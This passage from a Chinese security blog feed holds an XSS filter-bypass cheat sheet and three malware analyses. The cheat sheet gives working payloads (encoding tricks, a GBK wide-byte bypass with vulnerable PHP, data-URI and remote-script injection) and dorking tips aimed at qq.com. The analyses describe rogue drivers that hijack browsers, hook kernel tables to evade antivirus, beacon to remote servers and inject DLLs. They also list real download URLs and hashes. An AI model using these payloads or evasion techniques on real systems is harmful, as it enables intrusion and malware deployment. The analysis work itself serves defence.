<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//过滤= 括号等 使用xml编码</span></span><br><span class="line">&lt;svg&gt; <span class="xml"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="undefined">prompt&amp;#40;1)</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>  </span><br><span class="line">//在SVG向量里面的<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="undefined">元素（或者其他CDATA元素 ），会先进行xml解析。因此&amp;#x28（十六进制）或者&amp;#40（十进制）或者&amp;lpar；（html实体编码）会被还原成（。</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">可以不封的有:</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="title">img</span>&gt;</span><span class="tag">&lt;<span class="title">br</span>&gt;</span><span class="tag">&lt;<span class="title">input</span>&gt;</span><span class="tag">&lt;<span class="title">li</span>&gt;</span><span class="tag">&lt;<span class="title">p</span>&gt;</span><span class="tag">&lt;<span class="title">SVG</span>&gt;</span></span><br><span class="line">其他标签不封闭会造成页面显示错误等问题。</span></span><br></pre></td></tr></table></figure>
<h3 id="xss中最经常用到的编码">xss中最经常用到的编码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">html实体编码(<span class="number">10</span>进制与<span class="number">16</span>进制):</span><br><span class="line">如把尖括号编码[ <span class="xml"><span class="tag">&lt; ]  <span class="attribute">-----</span>&gt;</span> html十进制: &amp;#60;  html十六进制:&amp;#x3c;</span><br><span class="line">javascript的八进制跟十六进制:</span><br><span class="line">如把尖括号编码[ <span class="tag">&lt; ]  <span class="attribute">-----</span>&gt;</span> js八进制:\74  js十六进制:\x3c</span><br><span class="line">jsunicode编码：</span><br><span class="line">如把尖括号编码[ <span class="tag">&lt; ]  <span class="attribute">-----</span>&gt;</span>jsunicode:\u003c</span><br><span class="line">url编码:</span><br><span class="line">如把尖括号编码[ <span class="tag">&lt; ]  <span class="attribute">-----</span>&gt;</span> url: %22</span><br><span class="line">base64编码:</span><br><span class="line">如把尖括号编码[ <span class="tag">&lt; ]  <span class="attribute">-----</span>&gt;</span> base64: Ig==</span></span><br></pre></td></tr></table></figure>
<h3 id="一些绕过方法">一些绕过方法</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">换行符 %<span class="number">0</span>a</span><br><span class="line">反斜线 %<span class="number">5</span>c （js中字符串可以用\分开）</span><br><span class="line">&lt;&gt;  %<span class="number">3</span>C%<span class="number">3</span>E</span><br><span class="line">注释<span class="comment">/**/</span>可以代替 空格符</span><br><span class="line">%c0(宽字符gb2312)可以吃掉%<span class="number">5</span>c(反斜线) </span><br><span class="line">javascript中的字符可以写成unicode编码：</span><br><span class="line">&lt; 可以表示为 \u003c , &gt; 可以表示为 \u003e，空格可以表示为\u0020</span><br><span class="line">&lt; 可以表示为 \x3c , &gt; 可以表示为 \x3e，空格可以表示为\x20</span><br><span class="line">&lt;img src=<span class="number">1</span> onerror=alert(<span class="number">1</span>)&gt;   ----&gt; \u003Cimg\u0020src=<span class="number">1</span>\u0020onerror=alert(<span class="number">1</span>)\u003e</span><br><span class="line">                                                 ----&gt;  \x3Cimg\u0020src=<span class="number">1</span>\u0020onerror=alert(<span class="number">1</span>)\x3e</span><br><span class="line"></span><br><span class="line">JS字符串中，字符还可以表示为unicode的形式。即：单引号还可以表示为\u0027或\x27,可尝试\有没有被过滤</span><br><span class="line">&lt;textarea&gt;、&lt;title&gt;、&lt;iframe&gt;标签不解析HTML</span><br><span class="line"><span class="string">"h"</span>+<span class="string">"t"</span>+<span class="string">"t"</span>+<span class="string">"p"</span>，绕过对http的过滤</span><br><span class="line">&lt;input onfocus=<span class="string">"alert(1)"</span> autofocus&gt;，自动执行</span><br><span class="line">&lt;scr&lt;script&gt;ipt&gt;绕过对&lt;script&gt;的过滤</span><br><span class="line"><span class="comment">/**/</span>绕过对空格的过滤&lt;script&gt;<span class="built_in">document</span>.write(<span class="string">"&lt;img/**/src='1'/**/onerror='alert(1)'/&gt;"</span>);<span class="xml"><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="actionscript">标签中多对输入可以结合<span class="comment">/**/</span>的使用</span><br><span class="line"><span class="keyword">var</span> a = <span class="string">""</span>;<span class="comment">/*"; 值为：";<span class="comment">/*，（首先闭合双引号，然后使用<span class="comment">/*注释，与下面注释进行闭合）var b = "*/</span>alert(1)//"; 值为：*/</span>alert(1)//</span><br><span class="line"></span><br><span class="line">如果是图片可能是判定后缀名在最后加上.jpg</span><br><span class="line">突破对长度的限制&lt;script&gt;eval(location.hash.slice(1))</span></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>#alert(‘a’)</span><br><span class="line">data协议，绕过chrome </span><br><span class="line">filter.php?url=<span class="tag">&lt;<span class="title">a</span> <span class="attribute">href</span>=<span class="value">'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='</span>&gt;</span>click<span class="tag">&lt;<span class="title">a</span>&gt;</span></span><br><span class="line">IE的注释方式<span class="comment">&lt;!--[if IE]&gt;&lt;img src=# width=0 height=0 onerror=alert(/insight-labs/)&gt;&lt;![endif]--&gt;</span></span><br><span class="line"></span><br><span class="line">chrome会自动对", &gt;, <span class="tag">&lt; 进行转换。</span><br><span class="line">&lt;<span class="attribute">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line">chrome会过滤为<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>,绕过：<span class="tag">&lt;<span class="title">script</span> <span class="attribute">src</span>=<span class="value">'127.0.0.1/1.js'</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span> 其中1.jp也可以是1.jpg等，内容为js代码如:alert(1)</span></span><br></pre></td></tr></table></figure>
<h3 id="chrome如何搜索关键字">chrome如何搜索关键字</h3><p>基本语句肯定是 site:qq.com filetype:swf<br>意思是，限定域名为qq.com 文件类型为FLASH文件。<br>显然这样会搜索出很多FLASH文件，不利于我们后续的漏洞查找，所以我们需要输入某个关键词来进一步缩小范围。<br>这里我列举一些寻找关键词的方式。<br>1 已知存在缺陷的FLASH文件名或参数名，如：swfupload,jwplayer等<br>2 多媒体功能的FLASH文件名，如：upload，player, music, video等<br>3 调用的外部配置或数据文件后缀，如: xml, php 等<br>4 前期经验积累下来的程序员特征参数名用词，如: callback, cb , function 等<br>结合以上经验，使用其中第三条：<br>搜索： site:qq.com filetype:swf inurl:xml<br>可以找到这个FLASH</p>
<h3 id="插入漏洞方式">插入漏洞方式</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">1 JavaScript中字符串之间的运算利用</span><br><span class="line">&lt;a href="javascript:alert(1)//html"&gt;click me&lt;/a&gt;</span><br><span class="line">&lt;a href="javascript:alert(1)-html"&gt;click me&lt;/a&gt;</span><br><span class="line">执行呈现相同的效果，因为javascript是弱类型语言，所以字符串与字符串之间的各种运算都是合法的</span><br><span class="line"></span><br><span class="line">2 HTML属性在执行时会做HTMLDecode编码</span><br><span class="line">HTML属性：十进制和十六进制，&amp;#56和&amp;#x5a形式 </span><br><span class="line">CSS属性：十进制和十六进制，\6c形式</span><br><span class="line">JavaScript：八进制和十六进制，\56,和\x5c形式，汉字需要使用Unicode编码，\u0000形式</span><br><span class="line">&lt;img src="http://www.baidu.com/img/bdlogo.gif"&gt;</span><br><span class="line">&lt;img src="&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3a;&amp;#x2f;&amp;#x2f;&amp;#x77;&amp;#x77;&amp;#x77;&amp;#x2e;&amp;#x62;&amp;#x61;&amp;#x69;&amp;#x64;&amp;#x75;&amp;#x2e;&amp;#x63;&amp;#x6f;&amp;#x6d;&amp;#x2f;&amp;#x69;&amp;#x6d;&amp;#x67;&amp;#x2f;&amp;#x62;&amp;#x64;&amp;#x6c;&amp;#x6f;&amp;#x67;&amp;#x6f;&amp;#x2e;&amp;#x67;&amp;#x69;&amp;#x66;";&gt;</span><br><span class="line">需要留出双引号，不可对双引号进行转移</span><br><span class="line"></span><br><span class="line">3、宽字节处理addslashs，单引号、双引号、反斜杠之前加反斜杠的情况</span><br><span class="line">原理：网页头部指明这是GBK编码，GBK编码第一字节的范围是0x81~0xFE，第二字节的范围是0x40~0x7E与0x80~0xFE，这样的十六进制表示。而\符号的十六进制表示为0x5C，正好是GBK的低字节中，如果之前有一个高字节，那么正好会被组成一个合法字符。</span><br><span class="line">&lt;?php </span><br><span class="line">header("Content-Type:text/html;charset=GBK");?&gt;  </span><br><span class="line">&lt;script&gt;      </span><br><span class="line">var a="</span><br><span class="line">&lt;?php </span><br><span class="line">echo addslashes($_GET['url']);</span><br><span class="line">?&gt;</span><br><span class="line">";  </span><br><span class="line">&lt;/script&gt;</span><br><span class="line">?&gt;  构造：.php?url=123%81";alert(1);//</span><br><span class="line"></span><br><span class="line">4、UTF-7编码(仅IE支持，会自动判断是否出现UTF-7编码的字符串)</span><br></pre></td></tr></table></figure>
<h3 id="DOM_xss特点">DOM xss特点</h3><ol>
<li>利用代码也是在地址栏里输入，</li>
<li>在JS里，通过location.search得到地址里的代码，类似的还有:<br>A.location.href : 地址栏里的地址,<br>B.location.hash: 地址栏里#及其之后的内容,<br>C.document.referrer: 当前页面的源（比如你从A.com点一个链接进入了B.com，那么B.com里的document.referrer等于A.com）</li>
<li>通过JS设置了iframe的src属性，这是一个典型的通过JS操作属性而导致的XSS。</li>
</ol>
<p>查找此类漏洞的方法 </p>
<ol>
<li>以location为关键词进行查找，</li>
<li>进而看location传入的参数是否被过滤后再进行使用。</li>
<li>如有未过滤而被调用的情况，则考虑如何构造利用代码。</li>
</ol>
<h3 id="11个免费的Web安全测试工具">11个免费的Web安全测试工具</h3><p>1.Netsparker Community Edition(Windows)<br>这个程序可以检测SQL注入和跨页脚本事件。当检测完成之后它会给你提供一些解决方案。<br>2.Websecurify(Windows, Linux, Mac OS X)<br>这是个简单易用的开源工具，此程序还有一些人插件支持，可以自动检测网页漏洞。运行后可生成多种格式的检测报告<br>3.Wapiti(Windows, Linux, Mac OS X)<br>这是一个用Python编写的开源的工具，可以检测网页应用程序，探测网页中存在的注入点。<br>4.N-Stalker Free Version(Windows)<br>此工具可一次检测100个以上的页面，包括跨页脚本的检测。<br>5.skipfish(Windows, Linux, Mac OS X)<br>这是一个轻量级的安全测试工具，处理速度很快，每秒可处理2000个请求。<br>6.Scrawlr(Windows)<br>HP的一款免费软件，可检测SQL注入漏洞。<br>7.Watcher(Windows) <a href="http://websecuritytool.codeplex.com/documentation" target="_blank" rel="external">http://websecuritytool.codeplex.com/documentation</a><br>这个是Fiddler的插件，可在后台静默运行，可检测跨域提交等。。<br>8.x5s(Windows) <a href="http://xss.codeplex.com/releases/view/43170" target="_blank" rel="external">http://xss.codeplex.com/releases/view/43170</a><br>跟前一个一样也是Fiddler的插件，用于检测存在XSS漏洞，在网页提供给用户输入的地方是否有过滤&lt;, &gt;等字符。<br>9.Exploit-Me(Windows, Linux, Mac OS X)<br>这个是火狐的插件，由XSS-Me，SQL Inject Me 和 Access-Me 这3个构成，当浏览网页时就会开始检测，可检测XSS漏洞，SQL注入漏洞等。<br>10.WebScarab(Windows, Linux, Mac OS X)<br>这个实际上是一个代理软件，有很多功能，可以检测XSS跨站脚本漏洞、SQL注入漏洞等。。<br>11.Acunetix Free Version(Windows)<br>这个是免费版，相对于专业版来说有一些功能限制，不过还是可以用的，可检测网站上的XSS漏洞。</p>
<h3 id="其他">其他</h3><p>1.二哥的XSS教学 - by gainover<br><a href="http://xsst.sinaapp.com/example/1-1.php" target="_blank" rel="external">http://xsst.sinaapp.com/example/1-1.php</a><br>2.心伤的瘦子 [腾讯实例教程] 那些年我们一起学XSS)<br><a href="http://www.wooyun.org/whitehats/%E5%BF%83%E4%BC%A4%E7%9A%84%E7%98%A6%E5%AD%90/type/1/page/1" target="_blank" rel="external">http://www.wooyun.org/whitehats/%E5%BF%83%E4%BC%A4%E7%9A%84%E7%98%A6%E5%AD%90/type/1/page/1</a><br>3.HTML特殊字符编码对照表<br><a href="http://www.jb51.net/onlineread/htmlchar.htm" target="_blank" rel="external">http://www.jb51.net/onlineread/htmlchar.htm</a><br>4.html字符实体<br><a href="http://www.w3school.com.cn/html/html_entities.asp" target="_blank" rel="external">http://www.w3school.com.cn/html/html_entities.asp</a><br>5.xss字符转换工具：<br><a href="http://app.baidu.com/app/enter?appid=280383" target="_blank" rel="external">http://app.baidu.com/app/enter?appid=280383</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>xss绕过技巧整理]]>
    
    </summary>
    
      <category term="xss" scheme="http://blog.idhyt.xyz/tags/xss/"/>
    
      <category term="web" scheme="http://blog.idhyt.xyz/categories/web/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[病毒分析-haimianbaobao流氓驱动]]></title>
    <link href="http://blog.idhyt.xyz/2014/09/10/3-virus-malware-driver-hmbb/"/>
    <id>http://blog.idhyt.xyz/2014/09/10/3-virus-malware-driver-hmbb/</id>
    <published>2014-09-10T09:52:11.000Z</published>
    <updated>2015-09-20T14:47:19.000Z</updated>
    <content type="html"><![CDATA[<p>haimianbaobao流氓驱动行为分析以及溯源追查<a id="more"></a></p>
<h2 id="简介">简介</h2><p>MD5 : b9003854bee6ea8e5b1fc24ebc99bb4a<br>行为: haimianbaobao.exe流氓驱动，劫持浏览器，过滤杀软</p>
<p>1.该驱动程序注册一个进程创建回调函数，监视浏览器创建主进程，注入dll文件对浏览器操作进行劫持。</p>
<p>2.通过HOOK驱动\FileSystem\Ntfs与SSDT表中大量的内核函数，从而过滤掉杀软对其操作，保护自身。</p>
<h2 id="行为分析">行为分析</h2><p>1.驱动加载后，先检测下驱动注册表，然后获取ntdll.dll模块基址，获取其函数导出地址<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-hmbb-1.png" alt=""><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-hmbb-2.png" alt=""></p>
<p>2.调用函数PsSetLoadImageNotifyRoutine创建一个进程创建回调函数NotifyRoutine，监控创建进程，如果是浏览器进程，则判断其父进程如果是explorer.exe进程，则将haimianbaobao.dll注入到该进程中，对浏览器进行劫持;<br>如果为haimianbaobao.exe进程，则加载。haimianbaobao.dll位于C:\Documents and Settings\admin\Lhb\InstDrv\haimianbaobao.dll<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-hmbb-3.png" alt=""></p>
<p>3.HOOK驱动\FileSystem\Ntfs的 IRP_MJ_DIRECTORY_CONTROL来过滤杀软文件操作来保护自身文件<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-hmbb-4.png" alt=""></p>
<p>4.判断如果IRP请求是杀软进程操作，则过滤掉其IRP请求<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-hmbb-5.png" alt=""><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-hmbb-6.png" alt=""></p>
<p>5.HOOK 驱动\FileSystem\Ntfs的 IRP_MJ_CREATE和IRP_MJ_READ来保护自身文件<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-hmbb-7.png" alt=""></p>
<p>6.检测操自身文件的请求进程如果不是以下进程列表，则过滤掉其IRP请求<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-hmbb-8.png" alt=""></p>
<p>7.创建进程用于过滤杀软请求，枚举系统模块信息，获取360驱动模块起始地址，获取的驱动模块分别为</p>
<pre><code>360Selfprotection.sys |<span class="string"> qutmdrv.sys </span>|<span class="string"> 360Avflt.sys </span>|<span class="string"> 360Box.sys </span>|<span class="string"> BAPIDRV.sys </span>
</code></pre><p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-hmbb-9.png" alt=""></p>
<p>8.根据系统版本，获取SSDT表索引，HOOK SSDT表<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-hmbb-10.png" alt=""></p>
<p>9.如果调用ZwQuerySystemInformation函数，如果其调用模块是否位于360驱动模块中，或者位于杀软进程模块中，且该函数是否对haimianbaobao.exe进程进行操作，则将haimianbaobao.exe进程从进程结构序列中去除。<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-hmbb-11.png" alt=""></p>
<p>10.相同原理，过滤掉杀软对自身的ZwQueryInformationProcess，ZwReadFile，ZwTerminateProcess等操作。</p>
<h2 id="溯源查找">溯源查找</h2><h3 id="概述">概述</h3><p>Haimianbaobao通过推广软件捆绑安装，感染主机之后会释放驱动文件对浏览器进行劫持，同时通过HOOK SSDT过滤掉360杀软的操作请求，使360杀软进入离线模式保护自身。</p>
<h3 id="推广行为">推广行为</h3><p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-hmbb-12.png" alt=""></p>
<p>1.简易计算器scalculator.exe(md5: 8fc563782ad0d18e757fee6374b976d6)<br>该程序以uninstallself参数方式启动，隐藏窗口后台运行。之后添加开机自启动，从配置文件读取usrid和version下载推广软件到目录\scalculator\_temp.exe。同时，还会调用同目录下\supdate.exe进行更新并记录配置文件。</p>
<p>2.推广程序_temp.exe(md5:4B863BD16F6FFBDB940F783D47669886)<br>该程序启动后从远程服务器下载安装推广软件haimianbaobao程序。<br>下载链接:</p>
<pre><code><span class="symbol">http:</span>/<span class="regexp">/k360.it537.com/maindata</span>3.php?install=<span class="number">00</span><span class="symbol">:</span><span class="number">0</span><span class="constant">C:</span><span class="number">29</span><span class="symbol">:D9</span><span class="symbol">:D9</span><span class="symbol">:AD&amp;qudaoid=&amp;ver=</span><span class="number">6.5</span>.<span class="number">1.9</span>&amp;name=haimianbaobao&amp;success=<span class="number">06</span>
</code></pre><p>更新链接:</p>
<pre><code><span class="string">http:</span><span class="comment">//updata.it537.com/cnzz/hmbb.html?qudaoid=&amp;ver=6.5.1.9&amp;name=haimianbaobao&amp;sucess=06</span>
</code></pre><p>日志文件 \haimianbaobao\bin\log_out.txt</p>
<pre><code><span class="symbol">http:</span>/<span class="regexp">/k360.it537.com/maindata</span>3.php?qw=bY4<span class="variable">%7BfFGuaE2vNFnxSyp</span><span class="variable">%7BNUrDPVoFQSqDQD</span><span class="variable">%5CweYQid1mmOT</span><span class="variable">%5C1</span><span class="variable">%5BZH</span><span class="variable">%3APh53KkGtPUYv</span><span class="variable">%5BV2nOXjgbY0q</span><span class="variable">%0F</span><span class="variable">%09ZY4j</span><span class="variable">%5BV</span><span class="variable">%3AkXX</span><span class="variable">%3Ald5Uk</span><span class="variable">%5B1W</span><span class="variable">%7Cb</span><span class="variable">%7B2vOi</span><span class="variable">%3C</span><span class="variable">%3E</span>
</code></pre><p>3.haimianbaobao推广程序<br>该程序会在感染系统加载驱动文件haimianbaobao.sys，该驱动程序注册一个进程创建回调函数，监视浏览器创建主进程，注入dll文件对浏览器操作进行劫持。同时通过HOOK驱动\FileSystem\Ntfs与SSDT表中大量的内核函数，从而过滤掉杀软的请求包，使杀软处于离线状态，保护自身。</p>
<p>4.后续分析<br>4.1 之前推断天之游侠游戏为推广母体不正确，该游戏启动时会遍历系统文件查找自身文件，因此对简易计算器文件有操作行为，查数据库时误以为是其释放，因此天之游侠游戏并非推广母体，暂时没有找到推广母体。<br>4.2 之后通过用户uuid查询用户最近几天的文件操作，发现存在天气日历，快看影视浏览器等推广软件，这几个软件是最近在黑top比较活跃的，因此暂时判断其为同一推广母体所推广安装，后续继续跟进。</p>
<p>5.查用户uuid = acc0be0a644b5b2fac08b1100ae3baf8最近的文件操作，里边有天气日历，快看影视，这些都是最近黑TOP比较活跃的推广软件，印象中首趣有推广这些软件，随进行分析。<br>官网下载链接：<a href="http://sq.cyousoft.com/" target="_blank" rel="external">http://sq.cyousoft.com/</a><br>MD5: 34E75CC128BB19B6D4E77315B8767123<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-hmbb-13.png" alt=""></p>
<p>6.程序进程启动起来后，先向远程服务器发送Get请求，获取推广安装包数据，链接为：</p>
<pre><code>xml.tai69.com/config.php?v=<span class="number">1.0</span><span class="number">.3</span><span class="number">.9</span>
</code></pre><p>推广安装包数据加密存储，抓包如下<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-hmbb-14.png" alt=""><br>将该数据下载到Temp目录下AAA.xml文件，该数据进行zip加密压缩， (压缩密码：123@*qSz) 解密过后得到推广软件列表。</p>
<pre><code>hao123|<span class="string">huaen123</span>|<span class="string">PPTV</span>|<span class="string">B5T_Setup.exe</span>|bdcalendar
</code></pre><p>推广列表中未找到简易计算器</p>
<p>7.百度搜haimianbaobao.dll 找到该篇帖子：<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-hmbb-15.png" alt=""><br>随后进入乐飞影视，随便找个视频播放，提示安装全能播放器<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-hmbb-16.png" alt=""></p>
<pre><code>最新版下载：首趣播放器 MD5: <span class="number">7</span>CC707937A415CF3EB88FBAF8242BA06 于<span class="number">0918</span>更新 MD5: <span class="number">6F</span>15675F2861B8AD9D2D499473062E08
备用版下载：鱼鱼影音浏览器 MD5: <span class="number">5</span>B41718D886BA3DD571CD55D4DCB16EE
</code></pre><p>8.首趣播放器<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-hmbb-17.png" alt=""><br>该程序运行先在Temp目录下释放setup文件，然后创建进程，启动参数为</p>
<pre><code><span class="string">"释放Setup文件"</span> /SL5=<span class="string">"<span class="variable">$B021C</span>,1045444,66048,首趣播放器"</span> 如下所示：
</code></pre><p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-hmbb-18.png" alt=""><br>新进程启动起来后，先向远程服务器发送Get请求，获取推广安装包数据，链接为：</p>
<pre><code>xml.tai69.com/config.php?v=<span class="number">1.0</span><span class="number">.4</span><span class="number">.2</span>
</code></pre><p>推广安装包数据加密存储，抓包如下<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-hmbb-19.png" alt=""><br>解密过后得到推广软件列表，未找到简易计算器。</p>
<pre><code>风行在线|<span class="string">壁纸在线</span>|<span class="string">设置导航为主页</span>|<span class="string">…</span>|<span class="string">天气日历 </span>|<span class="string"> 快看影视</span>|<span class="string">…</span>
</code></pre><p>在推广软件列表中未找到简易计算器。<br>同样0918更新推广的软件列表中也没有找到简易计算器。</p>
<p>9.鱼鱼影音浏览器 推广安装列表：download.yuyu.com/0822/setup.html<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-hmbb-20.png" alt=""><br>在推广列表中未找到简易计算器。</p>
<p>10.后续<br>卒…</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>haimianbaobao流氓驱动行为分析以及溯源追查]]>
    
    </summary>
    
      <category term="virus" scheme="http://blog.idhyt.xyz/tags/virus/"/>
    
      <category term="逆向" scheme="http://blog.idhyt.xyz/categories/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[病毒分析-驱动过滤]]></title>
    <link href="http://blog.idhyt.xyz/2014/09/02/3-virus-malware-driver-filter/"/>
    <id>http://blog.idhyt.xyz/2014/09/02/3-virus-malware-driver-filter/</id>
    <published>2014-09-02T08:54:11.000Z</published>
    <updated>2015-09-20T14:47:19.000Z</updated>
    <content type="html"><![CDATA[<p>一个流氓驱动行为简略分析<a id="more"></a></p>
<h2 id="简介">简介</h2><p>驱动模块主要两个功能：<br>1.通过PsSetLoadImageNotifyRoutine创建一个进程创建回调函数NotifyRoutine，用于监控explorer.exe进程进行注入</p>
<p>2.添加TCP过滤，用于向远程服务器发送GET请求，请求数据为各个函数调用状态</p>
<p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-1.jpg" alt=""></p>
<h2 id="行为">行为</h2><h3 id="TCP驱动过滤">TCP驱动过滤</h3><p>1.通过IoCreateDevice，IoAttachDeviceToDeviceStack等函数创建设备对象。程序每个函数调用结果会通过该设备对象发送远程服务器<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-2.jpg" alt=""></p>
<p>2.其中Host采用16进制写入变量中，循环向这四个服务器发送请求，服务器响应暂停<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-3.jpg" alt=""><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-4.jpg" alt=""></p>
<pre><code>MsgLog为各函数调用状态
QuDao为驱动winntnetsys.sys注册表下DisplayName的键值中的标识符
<span class="keyword">MAC</span>为本机<span class="keyword">MAC</span>地址
SESID为当前系统时间
</code></pre><p>3.抓包如下所示：<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-5.jpg" alt=""></p>
<h3 id="进程注入">进程注入</h3><p>1.进程创建回调函数NotifyRoutine，先检测系统，如果不是XP和WIN7不进行注入，之后调用PsCreateSystemThread创建注入进程<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-6.jpg" alt=""></p>
<p>2.通过IoGetCurrentProcess获取进程EPROCESS结构，然后取偏移0x174(win7下为0x16C)获取ImageFileName，判断是否为exploere.exe进程，如果是的话调用PsGetProcessId返回进程ID<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-7.jpg" alt=""></p>
<p>3.获取\SystemRoot\system32\目录下的thunk.dll和winntnetsys.dll，计算出MD5值进行效验，效验成功开始注入。注入通过修改PEB结构+0x18处DefaultHeap到自定义的堆结构中，将其插入APC队列中加载到内存。<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-8.jpg" alt=""><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-9.jpg" alt=""></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>一个流氓驱动行为简略分析]]>
    
    </summary>
    
      <category term="virus" scheme="http://blog.idhyt.xyz/tags/virus/"/>
    
      <category term="逆向" scheme="http://blog.idhyt.xyz/categories/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[病毒分析-捆绑推广]]></title>
    <link href="http://blog.idhyt.xyz/2014/07/24/3-virus-malware-winrar/"/>
    <id>http://blog.idhyt.xyz/2014/07/24/3-virus-malware-winrar/</id>
    <published>2014-07-24T06:13:11.000Z</published>
    <updated>2015-09-20T14:47:19.000Z</updated>
    <content type="html"><![CDATA[<p>捆绑安装，流氓推广<a id="more"></a></p>
<h2 id="简介">简介</h2><p>1.压缩软件Winrar官方安装包中附带了没有数字签名病毒文件WinRAROp.exe，该文件在Winrar安装时一并运行。</p>
<p>2.病毒文件运行之后解密同目录下的zap.dat文件并释放病毒子体sclvntfy.dll文件以及驱动文件，之后添加驱动服务以及设置自启动，篡改浏览器主页，终止杀软，劫持用户浏览器打开推广页面<a href="http://123.sogou.com/?21607" target="_blank" rel="external">http://123.sogou.com/?21607</a></p>
<h2 id="母体运行流程">母体运行流程</h2><p>释放子体<br>1.创建目录”C:\RavRecycle\temp\”,7F,””,7F,””,7F,””,7F,””,7F,””,7F,””,7F,””,7F,”?..\”并设置属性为HIDDEN|SYSTEM|DIRECTORY</p>
<p>2.将Winrar安装包中的zap.dat文件重命名拷贝到创建的目录C:\RavRecycle\temp\”,7F,””,7F,””,7F,””,7F,””,7F,””,7F,””,7F,””,7F,”?..\ravtmp0.dat</p>
